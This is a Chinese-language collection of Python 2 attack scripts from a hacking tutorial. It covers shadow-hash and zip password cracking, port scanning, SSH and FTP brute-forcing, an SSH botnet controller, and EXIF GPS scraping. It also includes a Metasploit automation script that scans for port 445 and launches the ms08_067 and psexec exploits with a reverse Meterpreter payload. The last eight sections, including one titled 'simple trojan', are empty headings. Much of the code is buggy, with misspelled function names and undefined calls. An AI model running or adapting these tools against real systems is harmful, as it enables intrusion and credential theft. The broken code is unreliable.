# 某教程涉及脚本

## 1、Linux口令破解

```text
# encoding: utf-8
import crypt


def testpass(cryptpass):
    #盐值，取两个$之间的字符串
    salt = cryptpass[cryptpass.find("$"):cryptpass.rfind("$")]
    #读取字典内容
    dictfile = open('dictionary.txt','r')
    #将字典里每行拿出来进行加密比对
    for word in dictfile.readlines():
        word = word.strip('\n')     # 去掉密码后的换行符
        # 将密码与盐值一起加密得到加密后的密文
        cryptword = crypt.crypt(word,salt)
        #将加密得到的密文与原始密文进行对比
        if (cryptword == cryptpass):
            print "[+] found password: " + word + "\n"
            return
    print "[-] password notfound.\n"
    return


def main():
    # 读取密码文件得到Linux口令
    passfile = open('mima.txt')
    # 对每一条口令进行破解
    for line in passfile.readlines():
        # 以口令中的:为分隔符
        if ":" in line:
            # 以第一个分隔符之前的为用户名
            user = line.split(':')[0]
            # 第一个分隔符与第二个之间的为加密口令
            cryptpass = line.split(':')[1].strip(' ')
            print "[*] cracking password for : " + user
            # 口令破解
            testpass(cryptpass)

if if __name__ == "__main__":
    main()
```

## 2、zip文件口令破解

### 1、zipfile库最初体验

```text
# encoding: utf-8

import zipfile

# 实例化压缩文件
zfile = zipfile("test.zip")

try:
    # 使用正确的密码解压文件
    zfile.extractall(pwd="123456")
except Exception,e:
    print e
```

### 2、使用extractall函数进行口令破解

```text
# encoding: utf-8

import zipfile

zfile = zipfile.ZipFile("test.zip")
# 打开字典
passfile = open('dictonary.txt')
# 遍历字典中的每一行
for line in passfile.readlines():
    # 去掉每一行末尾的换行符即为密码
    password = line.strip('\n')
    try:
        # 用每行的密码尝试解压文件
        zfile.extractall(pwd=password)
        # 解压成功，则打印密码
        print '[+] password = ' + password + '\n'
        exit(0)
    # 密码不正确则抛出异常并尝试下一个密码
    except Exception,e:
        pass
```

### 3、添加了函数模块化

```text
# encoding: utf-8

import zipfile
# 模块化脚本，创建解压脚本函数
def extractfile(zfile,password):
    try:
        # 尝试解压文件，成功返回密码，否则抛出异常
        zfile.extractall(pwd = password)
        return password
    except:
        return

def mian():
    # 实例化压缩文件
    zfile = zipfile.ZipFile('test.zip')
    # 打开字典
    passfile = open('pass.txt')
    # 将字典每行的密码进行匹配
    for line in passfile.readlines():
        password = line.strip('\n')
        # 调用解压函数
        guess = extractfile(zfile,password)

        if guess:   # 要是guess是TRUE，则打印出密码
            print '[+] password = ' + password + '\n'
            exit(0)

if __name__ == "__main__":
    mian()
```

## 3、端口扫描器

### 1、获取命令参数主机名和端口

```text
# encoding: utf-8

import optparse
# 创建对象实例
parser = optparse.OptionParser('usage %prog  -H <target host> -p <target ports>')
# 需要的命令行参数
parser.add_option('-H',dest='Host',type='srting',help='specify target host')
parser.add_option('-p',dest='ports',type='srting',help='specify target host')

# 解析命令行
(Option,args) = parser.parse_args()
# 实例化参数
Host = Options.host
Ports = str(Options.Ports).split(',')
if (Host == None)|(Ports == None):
    print parser.usage
    exit(0)
```

### 2、加入connscan函数

```text
# encoding: utf-8

import optparse
# 使用socket库
from socket import *

def connscan(host,port):
    try:
        # 实例化socket
        connskt = socket(AF_INET,SOCK_STREAM)
        # socket连接目标端口，连接成功则打印出该端口
        connskt.connect((host,port))
        print '[+] %d/tcp open'% port
        # 关闭连接
        connskt.close()

    except:
        # 端口连接不成功打印出错误信息
        print '[-] %d/tcp closed'% port

def portscan(host,ports):
    try:
        # 获取目标IP地址
        ip = gethostbyname(host)
    
    except:
        # 获取不到IP地址，打印出错误信息
        print "[-] cannot resolve '%s' : unknown host" %host
        return
    
    try:
        # 获取目标主机名
        name = gethostbyaddr(ip)
        print '\n[+] scan result for: '+name[0]
    
    except:
        # 获取不到主机名则显示IP
        print '\n[+] scan result for: '+ip
    # 设置默认超市时间
    setdefaulttimeout(1)
    # 遍历每个端口
    for port in ports:
        print 'scanning port '+port
        # 调用连接函数
        connscan(host,int(ports))
```

### 3、抓取目标应用banner，获取更详细信息

```text
# encoding: utf-8

import parser
from socket import *

def connscan(host,port):
    try:
        connskt = socket(AF_INET,SOCK_STREAM)
        connskt.connect((host,port))
        # 向连接成功的端口发送字符串
        connskt.send('quiet simple\r\n')
        # 接收目标端口返回值
        results = connskt.recv(100)
        print '[+] %d/tcp open'% port
        # 打印出目标端口的发回执
        print '[+] ' + str(results)
        connskt.close()
    except:
        print '[-] %d/tcp closed'% port

def portscan(host,ports):
    try:
        ip = gethostbyname(host)
    except:
        print "[-] cannot resolve '%s': unknown host" %host
        return
    try:
        name = gethostbyaddr(ip)
        print '\n[+] scan results for :'+name[0]
    except:
        print '\n[+] scan results for :'+ip
    setdefaulttimeout(1)
    for port in ports:
        print 'scanning port' + port
        connscan(host,int(port))

def main():
    parser = optparse.optionparser('usage %prog -H <target host> -p <target ports>')
    parser.add_option('-H',dest='host',type='string',help='specify target host')
    parser.add_option('-p',dest='ports',type='string',help='specify target ports')
    (options,args) = parser.parser_args()
    host = options.host
    ports = str(options.ports).split(',')
    if (host == None) | (ports == None):
        print parser.usage
        exit(0)
    # 调用函数进行扫描
    portscan(host,ports)

if __name__ == "__main__":
    main()
```

### 4、添加信号量以及加锁

```text
# encoding: utf-8

import parser
from socket import *
from threading import *

# 实例化一个信号量
screenlock = Semaphore(value=1)
def connscan(host,port):
    try:
        connskt = socket(AF_INET,SOCK_STREAM)
        connskt.connect((host,port))
        connskt.send('quiet simple\r\n')
        results = connskt.recv(100)
        # 加锁
        screenlock.acquire()
        print '[+] %d/tcp open'% port
        print '[+] ' + str(results)
    except:
        screenlock.acquire()
        print '[-] %d/tcp closed'% port
    finally:
        # 解锁
        screenlock.release()
        connskt.close()

def portscan(host,ports):
    try:
        ip = gethostbyname(host)
    except:
        print "[-] cannot resolve '%s': unknown host" %host
        return
    try:
        name = gethostbyaddr(ip)
        print '\n[+] scan results for :'+name[0]
    except:
        print '\n[+] scan results for :'+ip
    setdefaulttimeout(1)
    for port in ports:
        print 'scanning port' + port
        connscan(host,int(port))

def main():
    parser = optparse.optionparser('usage %prog -H <target host> -p <target ports>')
    parser.add_option('-H',dest='host',type='string',help='specify target host')
    parser.add_option('-p',dest='ports',type='string',help='specify target ports')
    (options,args) = parser.parser_args()
    host = options.host
    ports = str(options.ports).split(',')
    if (host == None) | (ports == None):
        print parser.usage
        exit(0)
    portscan(host,ports)

if __name__ == "__main__":
    main()
```

## 4、构建SSH僵尸网络

### 1、pexpect库

```text
# encoding: utf-8

# 引用第三方库
import pexpect
# 命令行提示符
PROMPT = ['#','>>>','>','\$']
# 传递命令
def send_command(child,cmd):
    child.sendline(cmd)
    # 期望获得的命令提示符
    child.expect(PROMPT)
    # 打印从SSH会话得到的结果
    print child.before

# 连接函数
def connect(user,host,password):
    ssh_newkey = 'are you sure you want to continue connecting'
    # 连接字符串
    connstr = 'ssh ' + user + '@' + host
    # 实例化连接
    child = pexpect.spawn(connstr)
    # 捕获ssh_newkey
    ret = child.expect([pexpect.TIMEOUT,ssh_newkey,'[P|p]assword: '])
    # 判断捕获信息
    if ret == 0:
        print '[-] error connecting'
        return
    if ret == 1:
        child.sendline('yes')
        ret = child.expect([pexpect.TIMEOUT,ssh_newkey,'[P|p]assword: '])
        if ret == 0:
            print '[-] error connecting'
            return
    # 输入密码
    child.sendline(password)
    # 捕获命令提示符
    child.expect(PROMPT)
    return child

def main():
    host = 'localhost'
    user = 'root'
    password = 'simple123'
    # ssh连接
    child = connect(user,host,password)
    # 发送命令
    send_command(child,'ls /root/')

if __name__ == "__main__":
    main()
```

### 2、pxssh\(\)函数

```text
# encoding: utf-8

# 引用pxssh库
from pexpect import pxssh
# 引用optparse库
import optparse
# 引用time库
import time
# 引用线程库
from threading import *

# 设置最大连接数
maxconnections = 5
# 设置连接锁
connection_lock = BoundedSemaphore(value=maxconnections)
found = False
fails = 0

# 连接函数
def connect(host,user,password,release):
    #全局变量
    global found
    global fails
    try:
        # 实例化
        s = pxssh.pxssh()
        # SSH连接
        s.login(host,user,password)
        # 连接成功打印密码
        print '[+] password found: ' + password
        found = True
    except Exception,e:
        # 判断异常原因，尝试重新连接
        if 'read_nonblocking' in str(e):
            fails += 1
            time.sleep(5)
            connect(host,user,password,False)
        elif 'synchronize with original prompt' in str(e):
            time.sleep(1)
            connect(host,user,password,False)
    finally:
        # 释放锁
        if release:
            connection_lock.release()

def mian():
    # 创建对象
    parser = optparse.OptionParser('usage %prog -H <target host> -u <user> -F <password list>')
    # 设定参数
    parser.add_option('-H',dest='host',type='string',help='specify target host')
    parser.add_option('-F',dest='password file',type='string',help='specify password file')
    parser.add_option('-u',dest='user',type='string',help='specify the user')
    # 解析命令
    (options,args) = parser.parser_args()
    # 获取参数
    host = options.host
    passwordfile = options.passwordfile
    user = options.user
    if host == None or passwordfile == None or user == None:
        print parser.usage
        exit(0)
    # 读取密码
    fn = open('passwordfile','r')
    # 尝试破解
    for line in fn.readlines():
        if found:
            print "[*] exiting: password found"
            exit(0)
        if fails > 5:
            print "[*] exiting: too many socket Timeouts"
            exit(0)
        # 加锁
        connection_lock.acquire()
        password = line.strip('\n')
        print "[-] testing: " + str(password)
        #实例化线程
        t = Thread(target=connect,args=(host,user,password,True))
        child = t.start

if __name__ == "__main__":
    main()
```

### 3、控制多台主机的版本

```text
# encoding: utf-8

from pexpect import pxssh

class client:
    # 初始化对象
    def __init__(self,host,user,password):
        self.host = host
        self.user = user
        self.password = password
        self.session = self.connect()
    # SSH连接
    def connect(self):
        try:
            s = pxssh.pxssh()
            s.login(self.host,self.user,self.password)
            return s
        except Exception,e:
            print e 
            print '[-] error connecting'
    # 传递命令
    def send_command(self,cmd):
        self.session.sendline(cmd)
        self.session.prompt()
        return self.session.before

# 遍历botnet发送命令
def botnetcommand(command):
    for client in botnet:
        output = client.send_command(command)
        print '[*] output from ' + client.host
        print '[+] ' + output

# 实例化client对象
def addclient(host,user,password):
    client = client(host,user,password)
    botnet.append(client)

# 记录client对象
botnet = []
addclient('127.0.0.1','root','simplexue123')
addclient('127.0.0.1','root','simplexue123')
addclient('127.0.0.1','root','simplexue123')

botnetcommand('uname -v')
botnetcommand('ls /root')
```

## 5、FTP口令扫描与网页搜索

### 1、确定服务器是否允许匿名登录

```text
# encoding: utf-8

# 引用ftplib库
import ftplib

# 判断目标是否允许匿名登录
def anonlogin(hostame):
    try:
        ftp = ftplib.FTP(hostame)
        # 匿名登录
        ftp.login('anonymous','me@youer.com')
        print '\n[*]' + str(hostame) + 'FTP anonymous login successded'
        ftp.quit()
        return True
    except Exception,e:
        print '\n[-] ' +str(hostame) + 'FTP anonymous logon failed.'
        return False

host = '192.168.1.3'
anonlogin(host)
```

### 2、FTP暴力破解

```text
# encoding: utf-8

import ftplib

# 暴力破解FTP口令
def brutelogin(hostname,passwdfile):
    p = open('passwdfile','r')
    # 尝试用每个口令登录目标FTP
    for line in p.readlines():
        user = line.split(':')[0]
        p = line.split(':')[1].strip('\n')
        print '[+] trying: ' + user + ': ' + p
        try:
            ftp = ftplib.FTP(hostname)
            ftp.login(user,p)
            print '\n[*]' + srt(hostname) + 'FTP login succeeded: ' + user +':' + p
            ftp.quit()
            return (user,p)
        except Exception,e:
            pass 
    print '\n[-] could not brute force ftp credentials.'
    return (None,None)

host = '192.168.1.3'
passwdfile = 'pass.txt'
brutelogin(host,passwdfile)
```

### 3、FTP网页搜索脚本

```text
# encoding: utf-8

import ftplib

# 发现默认页面
def returndefault(ftp):
    try:
        # 获取FTP目录
        dirlist = ftp.nlist()
    except:
        dirlist = []
        print '[-] could not list directory contents'
        print '[-] skipping to next target'
        return
    # 默认页面列表
    retlist = []
    for filename in dirlist:
        fn = filename.lower()
        # 寻找特定后缀的文件名
        if '.php' in fn or '.htm' in fn or '.asp' in fn:
            print '[+] found  default page: ' + filename
            retlist.append(filename)
            return retlist

host = '192.168.1.3'
username = 'administrator'
password = '123456'
# 实例化FTP连接
ftp = ftplib.FTP(host)
ftp.login(username,password)
returndefault(ftp)
```

### 4、前三个脚本的整合

```text
# encoding: utf-8

import ftplib
import optparse

# 匿名登录
def anonlogin(hostname):
    try:
        ftp = ftplib.FTP(hostname)
        ftp.login('anonymous','me@youer.com')
        print '\n[*]' + str(hostame) + 'FTP anonymous login successded'
        ftp.quit()
        return True
    except Exception,e:
        print '\n[-] ' +str(hostame) + 'FTP anonymous logon failed.'
        return False

# 破解口令
def brutelogin(hostname,passwdfile):
    p = open('passwdfile','r')
    for line in p.readlines():
        user = line.split(':')[0]
        p = line.split(':')[1].strip('\n')
        print '[+] trying: ' + user + ': ' + p
        try:
            ftp = ftplib.FTP(hostname)
            ftp.login(user,p)
            print '\n[*]' + srt(hostname) + 'FTP login succeeded: ' + user +':' + p
            ftp.quit()
            return (user,p)
        except Exception,e:
            pass 
    print '\n[-] could not brute force ftp credentials.'
    return (None,None)

# 发现默认页面
def returndefault(ftp):
    try:
        dirlist = ftp.nlist()
    except:
        dirlist = []
        print '[-] could not list directory contents'
        print '[-] skipping to next target'
        return
    retlist = []
    for filename in dirlist:
        fn = filename.lower()
        if '.php' in fn or '.htm' in fn or '.asp' in fn:
            print '[+] found  default page: ' + filename
            retlist.append(filename)
            return retlist

def mian():
    parser = optparse.OptionParser('usage %prog -H <target host[s]> [-f <userpass file>]')
    parser.add_option('-H',dest='thost',type='string',help='specify target host')
    parser.add_option('-f',dest='passwdfile',type='string',help='specify user/password file')
    (options,args) = parser.parser_args()
    thost = options.thost
    passwdfile = options.passwdfile
    if thost == None:
        print parser.usage
        exit (0)
    username = None
    password = None
    # 尝试匿名登录
    if anonlogin(thost) == True:
        username = 'administrator'
        password = '123456'
        ftp = ftplib.FTP(thost)
        ftp.login(username,password)
        returndefault(ftp)
    # 尝试暴力破解登录
    elif passwdfile != None:
        (username,password) = brutelogin(thost,passwdfile)
        ftp = ftplib.FTP(thost)
        ftp.login(username,password)
        returndefault(ftp)

if __name__ == "__main__":
    main()
```

## 6、python脚本与metasploit交互

### 1、扫描开放了445端口的主机

```text
# encoding: utf-8

# 使用nmap库
import nmap

def findtarget():
    # 实例化端口扫描
    nmscan = nmap,portscanner()
    # 扫描开放了445端口的主机并将其放置在数组中返回
    nmscan.scan(subnet,'445')
    targets = []
    for t in nmscan.all_hosts():
        if nmscan[t].has_tcp(445):
            state = nmscan[t]['tcp'][445]['state']
            if state == 'open':
                print '[+] found target host: ' + t
                targets.append(t)
    return targets
```

### 2、新建监听器

```text
# encoding: utf-8
## 

# 监听被黑掉的目标
def setuphandler(configfile,lhost,lport):
    # 使用该模块发布命令
    configfile.write('use exploit/multi/handler\n')
    # 设定载荷，IP，端口
    configfile.write('set PAYLOAD windows/meterpreter/reverse_tcp\n')
    configfile.write('set LPORT ' + str(lport) + '\n')
    configfile.write('set LHOST ' + lhost + '\n')
    configfile.write('exploit -j -z\n')
    # 不重复新建监听器
    configfile.write('setg DisablePaloadHandler 1\n')
```

### 3、执行漏洞利用代码

```text
# encoding: utf-8

# 漏洞利用
def setuphandler(configfile,target,lhost,lport):
    # 漏洞利用代码
    configfile.write('use exploit/windows/smb/ms08_067_netapi\n')
    # 设定参数
    configfile.write('set RHOST ' + str(target) + '\n')
    configfile.write('set PAYLOAD windows/meterpreter/reverse_tcp\n')
    configfile.write('set LPORT ' + str(lport) + '\n')
    configfile.write('set LHOST ' + lhost + '\n')
    # 执行
    configfile.write('exploit -j -z\n')
```

### 4、暴力破解SMB用户

```text
# encoding: utf-8

# SMB暴力破解
def smbbrute(configfile,target,passwdfile,lhost,lport):
    username = 'Administrator'
    passwdfile = open(passwdfile,'r')
    # 逐个密码尝试进行破解
    for password in passwdfile.readlines():
        password = password.strip('\n').strip
    configfile.write('use exploit/windows/smb/psexec\n')
    configfile.write('set SMBUser ' + str(username) + '\n')
    configfile.write('set SMBUser ' + str(password) + '\n')
    configfile.write('set RHOST ' + str(target) + '\n')
    configfile.write('set PAYLOAD windows/meterpreter/reverse_tcp\n')
    configfile.write('set LPORT ' + str(lport) + '\n')
    configfile.write('set LHOST ' + lhost + '\n')
    configfile.write('exploit -j -z\n')
```

### 5、前四个代码的整合

```text
# encoding: utf-8
## 
import os
import optparse
import sys
import nmap

# 与nmap交互发现开放了445端口的主机
def findtarget():
    # 实例化端口扫描
    nmscan = nmap,portscanner()
    nmscan.scan(subnet,'445')
    targets = []
    for t in nmscan.all_hosts():
        if nmscan[t].has_tcp(445):
            state = nmscan[t]['tcp'][445]['state']
            if state == 'open':
                print '[+] found target host: ' + t
                targets.append(t)
    return targets

# 监听被黑掉的目标
def setuphandler(configfile,lhost,lport):
    configfile.write('use exploit/multi/handler\n')
    configfile.write('set PAYLOAD windows/meterpreter/reverse_tcp\n')
    configfile.write('set LPORT ' + str(lport) + '\n')
    configfile.write('set LHOST ' + lhost + '\n')
    configfile.write('exploit -j -z\n')
    configfile.write('setg DisablePaloadHandler 1\n')

# 攻击模块
def setuphandler(configfile,target,lhost,lport):
    configfile.write('use exploit/windows/smb/ms08_067_netapi\n')
    configfile.write('set RHOST ' + str(target) + '\n')
    configfile.write('set PAYLOAD windows/meterpreter/reverse_tcp\n')
    configfile.write('set LPORT ' + str(lport) + '\n')
    configfile.write('set LHOST ' + lhost + '\n')
    configfile.write('exploit -j -z\n')

# SMB暴力破解
def smbbrute(configfile,target,passwdfile,lhost,lport):
    username = 'Administrator'
    passwdfile = open(passwdfile,'r')
    for password in passwdfile.readlines():
        password = password.strip('\n').strip
    configfile.write('use exploit/windows/smb/psexec\n')
    configfile.write('set SMBUser ' + str(username) + '\n')
    configfile.write('set SMBUser ' + str(password) + '\n')
    configfile.write('set RHOST ' + str(target) + '\n')
    configfile.write('set PAYLOAD windows/meterpreter/reverse_tcp\n')
    configfile.write('set LPORT ' + str(lport) + '\n')
    configfile.write('set LHOST ' + lhost + '\n')
    configfile.write('exploit -j -z\n')

def main():
    # 写方式打开配置文件
    configfile = open('meta.rc','w')
    parser = optparse.optionparser('[-] usage %prog -H <RHOST[s]> -l <LHOST> [-p <LPORT -F <password file>]')
    parser.add_option('-H',dest='target',type='string',help='specify the target address[es]')
    parser.add_option('-p',dest='lport',type='string',help='specify the listen port')
    parser.add_option('-l',dest='lhost',type='string',help='specify the listen address')
    parser.add_option('-F',dest='passwdfile',type='string',help='password file for SMB brute force attempt')
    (options,args) = parser.parser_args()
    if (opyions.target == None) | (lhost == None):
        print parser.usage
        exit(0)
    lhost = options.lhost
    lport = options.lport
    if lport == None:
        lport = '2333'
    passsdfile = options.passsdfile
    # 寻找目标
    targets = findtarget(options.target)
    setuphandler(configfile,lhost,lport)
    # 逐个攻击
    for target in targets:
        confickerexploit(configfile,target,lhost,lport)
        if passwdfile != None:
            smbbrute(configfile,target,passsdfile,lhost,lport)
    configfile.close()
    # 启动metasploit并读取配置文件
    os.system('msfconsole -r meta.rc')

if __name__ == "__main__":
        main()

```

## 7、回收站内容检查

### 1、检测回收站目录

```text
# encoding: utf-8

import os

def returndir():
    dirs = ['C:\\Recycler\\','C:\\Recycled\\','C:\\Recycle.Bin\\']
    for recycledir in dirs:
        if os.path.isdir(recycledir):
            return recycledir
        return None

print returndir()
```

### 2、提取注册表中的用户名

```text
# encoding: utf-8

# 导入注册表库
from _winreg import *

#提取注册表中存放的用户名
def sid2user(sid):
    try:
        key = Openkey(HKEY_LOCAL_MAACHINE,"SOFTWARE\Microsoft\Windows NT\CurrentVersion\ProfileList" + '\\' + sid)
        (Value,type) = QueryValueEx(key,'ProfileImagePath')
        user = value.split('\\')[-1]
        return user
    except:
        return sid
```

### 3、打印所有被放入回收站的文件

```text
# encoding: utf-8

import os
from _winreg import *

def sid2user(sid):
    try:
        key = Openkey(HKEY_LOCAL_MAACHINE,"SOFTWARE\Microsoft\Windows NT\CurrentVersion\ProfileList" + '\\' + sid)
        (Value,type) = QueryValueEx(key,'ProfileImagePath')
        user = value.split('\\')[-1]
        return user
    except:
        return sid

def returndir():
    dirs = ['C:\\Recycler\\','C:\\Recycled\\','C:\\Recycle.Bin\\']
    for recycledir in dirs:
        if os.path.isdir(recycledir):
            return recycledir
        return None

def findrecycled(recycledir):
    dirlist = os.listdir(recycledir)
    for sid in dirlist:
        files = os.listdir(recycledir + sid)
        user = sid2user(sid)
        print '\n[*] listing files for user:' + str(user)
        for file in files:
            print '[+] found file: ' + str(file)
        
def mian():
    recycledir = returndir()
    findrecycled(recycledir)

if __name__ == "__main__":
    main()

```

## 8、读取文件EXIF元数据

### 1、查找image标签

```text
# encoding: utf-8

import urllib2
# 导入相关库
from bs4 import BeautifulSoup

# 发现网页中的图片
def findimages(url):
    print '[+\ finding images on ' + url
    # 读取HTML中的文档内容
    urlcontent = urllib2.open(url).read()
    # 创建一个beautifulsoup对象
    soup = BeautifulSoup(urlcontent,"lxml")
    # 寻找所有标记为img的标签
    imgtags = soup.findall('img')
    return imgtags
```

### 2、下载图片

```text
# encoding: utf-8

# 导入相应库
import urllib2
from os.path import basename
from urlparse import urlsplit

# 下载图片
def downloadimage(imgtag,url):
    try:
        print '[+] downloading image...'
        # 图片地址
        imgsrc = imgtag['src']
        # 读取图片内容
        imgcontent = urllib2.urlopen(url + imgsrc).read()
        imgfilename = basename(urlsplit(imgsrc0[2]))
        imgfile = open(imgfilename,'wb')
        # 写入图片内容
        imgfile.write(imgcontent)
        imgfile.close()
        return imgfilename
    except:
        return ''
```

### 3、获取文件元数据

```text
# encoding: utf-8

def testforexif(imgfilename):
    try:
        exifdata = {}
        imgfile = image.open(imgfilename)
        # 获取文件中的元数据
        info = imgfile._getexif()
        if info:
            # 遍历元数据数组查找含有GPSInfo的exif标签
            for (tag,value) in info.items():
                decoded = tags.get(tag,tag)
                exifdata[decoded] = value
            exifgps = exifdata['gpsinfo']
            if exifgps:
                print '[*] ' + imgfilename + ' cintains GPS metadata'
    except:
        pass
```

### 4、代码整合

```text
# encoding: utf-8

# 导入相应库
import urllib2
import optparse
from bs4 import BeautifulSoup
from urlparse import urlsplit
from os.path import basename
from PIL import image
from PIL.exiftags import tags

# 寻找图片标签
def findimages(url):
    print '[+\ finding images on ' + url
    # 读取HTML中的文档内容
    urlcontent = urllib2.open(url).read()
    # 创建一个beautifulsoup对象
    soup = BeautifulSoup(urlcontent,"lxml")
    # 寻找所有标记为img的标签
    imgtags = soup.findall('img')
    return imgtags

# 下载图片
def downloadimage(imgtag,url):
    try:
        print '[+] downloading image...'
        # 图片地址
        imgsrc = imgtag['src']
        # 读取图片内容
        imgcontent = urllib2.urlopen(url + imgsrc).read()
        imgfilename = basename(urlsplit(imgsrc0[2]))
        imgfile = open(imgfilename,'wb')
        # 写入图片内容
        imgfile.write(imgcontent)
        imgfile.close()
        return imgfilename
    except:
        return ''

# 查看元数据寻找GPSInfo
def testforexif(imgfilename):
    try:
        exifdata = {}
        imgfile = image.open(imgfilename)
        # 获取文件中的元数据
        info = imgfile._getexif()
        if info:
            # 遍历元数据数组查找含有GPSInfo的exif标签
            for (tag,value) in info.items():
                decoded = tags.get(tag,tag)
                exifdata[decoded] = value
            exifgps = exifdata['gpsinfo']
            if exifgps:
                print '[*] ' + imgfilename + ' cintains GPS metadata'
    except:
        pass

# 主函数运行
def main():
    parser = optparse.optionparser('usage %prog -u <target url>')
    parser.add_option('-u',dest='url',type='string',help='specify url address')
    (options,args) = parser.parser_args()
    url = options.url
    if url == None:
        print parser.usage
        exit(0)
    else:
        imgtags = findimages(url)
        for imgtag in imgtags:
            imgfilename = downloadimage(imgtag,url)
            testforexif(imgfilename)

if __name__ == "__main__":
    mian()
```

## 9、解析火狐浏览器ssqlite3数据库



## 10、解析TTL字段值



## 11、用anonBrowser抓取web页面



## 12、多线程爆破mysql



## 13、IP段端口扫描



## 14、TCP端口扫描



## 15、Telnet密码爆破



## 16、简易木马程序



